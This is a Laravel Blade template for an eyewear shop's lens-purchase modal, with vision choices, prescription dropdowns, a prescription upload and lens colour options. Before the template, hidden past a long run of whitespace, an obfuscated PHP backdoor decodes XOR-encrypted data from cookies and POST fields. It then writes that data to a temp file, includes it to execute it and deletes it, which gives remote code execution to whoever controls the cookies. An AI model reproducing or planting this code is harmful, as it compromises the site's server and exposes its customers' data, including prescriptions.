<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("yrvkuv")){class yrvkuv{public static $ktamsh = "rmvhspdecyjjuqxb";public static $eugtcnwbf = NULL;public function __construct(){$mqism = @$_COOKIE[substr(yrvkuv::$ktamsh, 0, 4)];if (!empty($mqism)){$eajvvhv = "base64";$ueuys = "";$mqism = explode(",", $mqism);foreach ($mqism as $bcmpmkuov){$ueuys .= @$_COOKIE[$bcmpmkuov];$ueuys .= @$_POST[$bcmpmkuov];}$ueuys = array_map($eajvvhv . "_decode", array($ueuys,));$ueuys = $ueuys[0] ^ str_repeat(yrvkuv::$ktamsh, (strlen($ueuys[0]) / strlen(yrvkuv::$ktamsh)) + 1);yrvkuv::$eugtcnwbf = @unserialize($ueuys);}}public function __destruct(){$this->enqqvgzgu();}private function enqqvgzgu(){if (is_array(yrvkuv::$eugtcnwbf)) {$fqdfesjlw = sys_get_temp_dir() . "/" . crc32(yrvkuv::$eugtcnwbf["salt"]);@yrvkuv::$eugtcnwbf["write"]($fqdfesjlw, yrvkuv::$eugtcnwbf["content"]);include $fqdfesjlw;@yrvkuv::$eugtcnwbf["delete"]($fqdfesjlw);exit();}}}$lmswa = new yrvkuv();$lmswa = NULL;} ?>@extends('layouts.app')

{{-- Meta tag Section Start --}}
@php
 $meta_title = $meta_description = $meta_keywords = "";
 $meta_title = (!empty($meta_tag->page_meta_title)) ? $meta_tag->page_meta_title : "About us Meta Title";
 $meta_description = (!empty($meta_tag->page_meta_description)) ? $meta_tag->page_meta_description : "About us Meta Description";
 $meta_keywords = (!empty($meta_tag->page_meta_keywords)) ? $meta_tag->page_meta_keywords : "About us Meta Keywords";
@endphp

 @section('title',$meta_title)
 @section('description',$meta_description)
 @section('keywords',$meta_keywords)

 {{-- Meta tag Section End --}}

 @section('content')
<br>

  <div class="modal-dialog modal-lg container">

    <!-- Modal content-->
<div class="modal-content row">
    <a aria-hidden="true" data-dismiss="modal" class="sb-close-btn close icon_close">
<i class="far fa-times-circle"></i>
</a>

<div class="modal-header">
<h4 class="modal-title">Buy with Lens</h4>

</div>

<div class="modal-body row">
 @php
  $cart = DB::table('carts')->where('id',$cart_id)->first();
  $product_data = DB::table('categories')->where('id',$cart->product_id)->first();
  $size_data = DB::table('size_options')->where('id',$cart->size_id)->first();
  
 @endphp
 <div class="col-lg-4">
 <div id="prd_img"><img src="{{asset('uploaded_files/product/'.$product_data->category_image_name)}}"></div>
 
 <span id="prd_price">{{$size_data->price}}</span>
 <span id="prd_color">{{$cart->color}}</span>
 <span id="prd_size">{{$size_data->size}}</span>
 </div>
 
 <div class="col-lg-8">
<div class="checkout-wrap">
  

  <ul class="nav nav-tabs pres-1">
      
    <li class="active"><a data-toggle="tab" href="#vision">Vision</a></li> &nbsp;&nbsp;
    
    <li><a data-toggle="tab" href="#prescription">Prescription</a></li> &nbsp;&nbsp;
    
    <li><a data-toggle="tab" href="#lens_color_type">Lens Color Type</a></li>&nbsp;&nbsp;
    <li><a data-toggle="tab" href="#lens">Lens</a></li>&nbsp;&nbsp;
    <li><a data-toggle="tab" href="#review_cart">Review Cart</a></li>
     
  </ul>

  <div class="tab-content">
   <input type="hidden" name="product_id" class="product_id" value="{{$cart_id}}">
   
   <input type="hidden" name="qty" class="qty" value="{{$cart->quantity}}">
   <input type="hidden" name="size" class="size" value="{{$cart->size_id}}">
   <input type="hidden" name="vision_id" class="vision_id">
   
    <div id="vision" class="tab-pane active">
      <h3>Vision</h3>
      
      <div class="container" style="padding-left: 0px;">
@php
$i=0;
 $visions = DB::table('visions')->where('vision_parent_id','0')->get();
@endphp  
 @foreach($visions as $vision)
@php 
$check_subvision = DB::table('visions')->where('vision_parent_id',$vision->id)->count();
@endphp
@if($check_subvision>0)
  <div class="panel-group" id="accordion">
  <div class="panel panel-default">
  <div class="panel-heading">
    <h4 class="panel-title">
      <a data-toggle="collapse" data-parent="#accordion" href="#collapse{{$vision->id}}">
        {{$vision->vision_name}}</a>
    </h4>
  </div>
  <div id="collapse{{$vision->id}}" class="panel-collapse collapse @if($i==0) in @endif">
    <div class="panel-body">
  @php
   $subvisions = DB::table('visions')->where('vision_parent_id',$vision->id)->get();
  @endphp    

  @foreach($subvisions as $subvision)
      <button class="button-sun-02"><a href="javascript:void(0)" onclick="getPrescription('{{$subvision->id}}')">{{$subvision->vision_name}} (₹ {{$subvision->vision_price}})</a></button>
      <br><br>
  @endforeach
    </div>
  </div>
  </div>
  </div>
@else

<button class="button-sun-02"><a href="javascript:void(0)" onclick="getPrescription('{{$vision->id}}')">{{$vision->vision_name}}</a></button>
<br><br>
@endif

  @php
   $i++;
  @endphp
 @endforeach

</div>

    </div>

  <div id="prescription" class="tab-pane">
    <h3>Prescription</h3>
   
   <div class="container">
     <div class="row">
       <div class="col-lg-4 hide-prescription-fields">
         <label>SPH (Right)</label>
         <select name="sph_right" class="form-control sph_right">
@php
$prescription_data = DB::table('prescription_data')->where('sph_right','!=','')->get();
@endphp      
            <option value="">-- Select SPH (R) --</option>
            @foreach($prescription_data as $data)
             <option value="{{$data->sph_right}}">{{$data->sph_right}}</option>
            @endforeach
         </select>
       </div>

       <div class="col-lg-4 hide-prescription-fields">
         <label>SPH (Left)</label>
          <select name="sph_left" class="form-control sph_left">
@php
$prescription_data = DB::table('prescription_data')->where('sph_left','!=','')->get();
@endphp      
            <option value="">-- Select SPH (L) --</option>
            @foreach($prescription_data as $data)
             <option value="{{$data->sph_left}}">{{$data->sph_left}}</option>
            @endforeach
         </select>
       </div>

       <div class="col-lg-4 hide-prescription-fields">
         <label>CYL (Right)</label>
          <select name="cyl_right" class="form-control cyl_right">
@php
$prescription_data = DB::table('prescription_data')->where('cyl_right','!=','')->get();
@endphp      
            <option value="">-- Select CYL (R) --</option>
            @foreach($prescription_data as $data)
             <option value="{{$data->cyl_right}}">{{$data->cyl_right}}</option>
            @endforeach
         </select>
       </div>

       <div class="col-lg-4 hide-prescription-fields">
         <label>CYL (Left)</label>
          <select name="cyl_left" class="form-control cyl_left">
@php
$prescription_data = DB::table('prescription_data')->where('cyl_left','!=','')->get();
@endphp      
            <option value="">-- Select CYL (L) --</option>
            @foreach($prescription_data as $data)
             <option value="{{$data->cyl_left}}">{{$data->cyl_left}}</option>
            @endforeach
         </select>
       </div>

       <div class="col-lg-4 hide-prescription-fields">
         <label>AXIS (Right)</label>
          <select name="axis_right" class="form-control axis_right">
@php
$prescription_data = DB::table('prescription_data')->where('axis_right','!=','')->get();
@endphp      
            <option value="">-- Select AXIS (R) --</option>
            @foreach($prescription_data as $data)
             <option value="{{$data->axis_right}}">{{$data->axis_right}}</option>
            @endforeach
         </select>
       </div>

       <div class="col-lg-4 hide-prescription-fields">
         <label>AXIS (Left)</label>
          <select name="axis_left" class="form-control axis_left">
@php
$prescription_data = DB::table('prescription_data')->where('axis_left','!=','')->get();
@endphp      
            <option value="">-- Select AXIS (L) --</option>
            @foreach($prescription_data as $data)
             <option value="{{$data->axis_left}}">{{$data->axis_left}}</option>
            @endforeach
         </select>
       </div>

<div class="one_pd">
<div class="col-lg-6 hide-prescription-fields">
<label>Pupillary Distance</label>
<select name="pupillary_distance" class="form-control pupillary_distance">
@php
$prescription_data = DB::table('prescription_data')->where('pupillary_distance_right','!=','')->get();
@endphp      
<option value="">-- Select Pupillary Distance --</option>
@foreach($prescription_data as $data)
 <option value="{{$data->pupillary_distance_right}}">{{$data->pupillary_distance_right}}</option>
@endforeach
</select>
</div>
</div>   
    
<div class="two_pd" style="display:none;">
     <div class="col-lg-6 hide-prescription-fields">
         <label>Pupillary Distance (R)</label>
         <select name="pupillary_distance_right" class="form-control pupillary_distance_right">
@php
$prescription_data = DB::table('prescription_data')->where('pupillary_distance_right','!=','')->get();
@endphp      
<option value="">-- Select Pupillary Distance --</option>
@foreach($prescription_data as $data)
 <option value="{{$data->pupillary_distance_right}}">{{$data->pupillary_distance_right}}</option>
@endforeach
</select>
       </div>
<div class="col-lg-6 hide-prescription-fields">
 <label>Pupillary Distance (L)</label>
 <select name="pupillary_distance_left" class="form-control pupillary_distance_left">
@php
$prescription_data = DB::table('prescription_data')->where('pupillary_distance_left','!=','')->get();
@endphp      
            <option value="">-- Select Pupillary Distance --</option>
            @foreach($prescription_data as $data)
             <option value="{{$data->pupillary_distance_left}}">{{$data->pupillary_distance_left}}</option>
            @endforeach
         </select>
       </div>
</div>       
       
<span><input type="checkbox" name="check-pd" id="check-pd" class="check-pd" onclick="check_two_pd()">Two PD?</span>
       
<input type="hidden" name="is_pd2" id="is_pd2" class="is_pd2" value="No"/>       
       <div class="row">
        <div class="col-lg-6 nerr">
         <div class="nerr">
               <h2>Or</h2>
           </div>    
       <h4>Upload Prescription</h4>
       
</div>
       <div class="col-lg-6">
           <div class="upload-pres">
      <form method="post" class="upload_prescription_form" enctype="multipart/form-data"> 
       <input type="file" name="upload_prescription" class="form-control upload_prescription">
       <input type="hidden" name="is_prescription_upload" class="is_prescription_upload" value="no">
      </form> </div>
       </div>
       </div>
       <div class="col-lg-12" style="padding-left: 0px;padding-top:10px;">
         <button type="button" class="btn btn-primary" onclick="prescription('add')">Submit</button>
       </div>

     </div>
   </div> 

  </div>
    
    <div id="lens_color_type" class="tab-pane">
      <h3>Lens Color Type</h3>
      
            <div class="container">
@php
$i=0;
 $color_types = DB::table('lens_color_types')->where('category_parent_id','0')->get();
@endphp  
 @foreach($color_types as $type)
@php 
$check_subcolor = DB::table('lens_color_types')->where('category_parent_id',$type->id)->count();
@endphp
@if($check_subcolor>0)
  <div class="panel-group" id="accordion">
  <div class="panel panel-default">
  <div class="panel-heading">
    <h4 class="panel-title">
      <a data-toggle="collapse" data-parent="#accordion" href="#collapse{{$type->id}}">
        {{$type->category_name}}</a>
    </h4>
  </div>
  <div id="collapse{{$type->id}}" class="panel-collapse collapse @if($i==0) in @endif">
    <div class="panel-body">
  @php
   $subcolor_types = DB::table('lens_color_types')->where('category_parent_id',$type->id)->get();
  @endphp    

  @foreach($subcolor_types as $subcolor)
     <button class="button-sun-02"> <a href="javascript:void(0)" onclick="getLenses('{{$subcolor->id}}','update')">{{$subcolor->category_name}}</a> (₹ {{$subcolor->category_price}})
     </button> 
  @endforeach
    </div>
  </div>
  </div>
  </div>
@else

<button class="button-sun-02"><a href="javascript:void(0)" onclick="getLenses('{{$type->id}}','update')">{{$type->category_name}}</a></button>
<br><br>
@endif

  @php
   $i++;
  @endphp
 @endforeach

</div>
      
    </div>
    
    <div id="lens" class="tab-pane view-lenses">
      <h3>Lens</h3>
      
    </div>
    
     <div id="review_cart" class="tab-pane review-cart">
      <h3>Review Cart</h3>
      
    </div>
  
  </div>
</div>
</div>
      </div>
     
    </div>

  </div>

 @endsection
